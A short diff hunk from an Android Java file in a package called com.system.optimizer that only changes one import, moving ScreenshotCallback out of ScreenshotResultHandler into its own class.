@@ -11,7 +11,7 @@ import android.os.Looper;
 import com.system.optimizer.network.SocketManager;
 import com.system.optimizer.config.AppConfig;
 import com.system.optimizer.config.ConfigData;
-import com.system.optimizer.service.ScreenshotResultHandler.ScreenshotCallback;
+import com.system.optimizer.service.ScreenshotCallback;
 
 import android.view.accessibility.AccessibilityEvent;
 
